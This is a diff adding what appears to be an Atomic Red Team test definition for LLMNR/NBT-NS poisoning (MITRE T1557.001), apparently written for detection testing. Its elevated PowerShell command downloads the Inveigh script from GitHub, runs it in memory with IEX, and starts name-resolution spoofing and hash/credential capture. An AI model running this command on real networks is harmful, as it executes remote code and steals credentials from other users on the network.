@@ -1,0 +1,15 @@
+attack_technique: T1557.001
+display_name: 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay'
+atomic_tests:
+- name: LLMNR Poisoning with Inveigh (PowerShell)
+  auto_generated_guid: deecd55f-afe0-4a62-9fba-4d1ba2deb321
+  description: 'Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.'
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
+      Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
+    name: powershell
+    elevation_required: true
